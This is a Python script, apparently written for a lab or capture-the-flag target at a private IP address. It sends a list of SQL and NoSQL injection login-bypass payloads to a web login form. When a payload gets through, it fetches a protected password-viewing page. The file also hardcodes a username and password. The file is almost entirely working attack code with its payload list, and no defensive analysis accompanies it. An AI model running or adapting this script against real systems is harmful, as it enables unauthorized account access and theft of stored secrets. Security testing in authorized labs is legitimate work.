import requests
import time
import logging
import sys
from typing import List, Dict, Optional
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('auth_test.log'),
        logging.StreamHandler(sys.stdout)  # Also print to console
    ]
)

class AuthenticationTester:
    def __init__(self, base_url: str):
        """Initialize the authentication tester"""
        self.base_url = base_url
        self.login_url = f"{base_url}/login"
        self.logout_url = f"{base_url}/logout"
        self.password_url = f"{base_url}/view-password"
        
        self.session = requests.Session()
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded",  # Ensure correct encoding
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }

    def test_authentication(self, username: str, password: str) -> Dict:
        """Test authentication with provided credentials"""
        print(f"\nTesting authentication - Username: {username}, Password: {password}")
        try:
            response = self.session.post(
                self.login_url,
                data={"username": username, "password": password},
                headers=self.headers,
                timeout=5
            )
            success = any(indicator in response.text.lower() 
                        for indicator in ["hello", "welcome", "dashboard", "success"])
            
            result = {
                "status_code": response.status_code,
                "response": response.text,
                "success": success,
                "length": len(response.text)
            }
            
            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")
            print(f"Success: {success}")
            
            return result

        except requests.exceptions.RequestException as e:
            print(f"Error during authentication: {str(e)}")
            logging.error(f"Authentication error: {str(e)}")
            return {"error": str(e)}

    def check_protected_resource(self) -> Dict:
        """Attempt to access protected resource"""
        print("\nChecking protected resource...")
        try:
            response = self.session.get(self.password_url, timeout=5)
            result = {
                "status_code": response.status_code,
                "response": response.text[:200],  # First 200 chars
                "length": len(response.text)
            }
            
            print(f"Protected Resource Status: {response.status_code}")
            print(f"Response Length: {len(response.text)}")
            
            return result

        except requests.exceptions.RequestException as e:
            print(f"Error accessing protected resource: {str(e)}")
            logging.error(f"Resource access error: {str(e)}")
            return {"error": str(e)}

def main():
    # More comprehensive payload list
    payloads = [
        # Basic SQL Injection
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "admin' -- ",
        "admin'#",
        "admin' OR '1'='1",
        # Advanced SQL Injection
        "' UNION SELECT 1,1#",
        "' OR 1=1 LIMIT 1 -- ",
        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": null}',
        # Special Characters
        "'",
        "' '",
        "%00",
        # Original credentials with variations
        "Nocky' -- ",
        "Nocky' OR '1'='1",
        "Nocky",  # Original username
    ]

    print("\n=== Starting Authentication Security Testing ===")
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Target URL: http://10.1.1.10:5001")
    print("================================================\n")

    tester = AuthenticationTester("http://10.1.1.10:5001")
    
    # Test legitimate credentials first
    print("\n[*] Testing original credentials...")
    original_test = tester.test_authentication("Nocky", "1234")
    logging.info(f"Original credentials test: {original_test}")

    successful_payloads = []

    # Test security patterns
    for i, payload in enumerate(payloads, 1):
        print(f"\n[{i}/{len(payloads)}] Testing payload: {payload}")
        
        # Try with empty password
        result = tester.test_authentication(payload, "")
        
        if result.get("success"):
            print("\n[!] POTENTIAL VULNERABILITY FOUND!")
            print(f"Successful payload: {payload}")
            successful_payloads.append(payload)
            
            protected_resource = tester.check_protected_resource()
            logging.warning(f"Successful auth bypass with payload: {payload}")
            logging.info(f"Protected resource access: {protected_resource}")
        
        time.sleep(1)  # Responsible testing delay

    # Summary
    print("\n=== Testing Complete ===")
    print(f"Total payloads tested: {len(payloads)}")
    print(f"Successful payloads: {len(successful_payloads)}")
    if successful_payloads:
        print("\nSuccessful payloads:")
        for i, payload in enumerate(successful_payloads, 1):
            print(f"{i}. {payload}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Testing interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] An error occurred: {str(e)}")
        logging.error(f"Main execution error: {str(e)}")
        sys.exit(1)
        
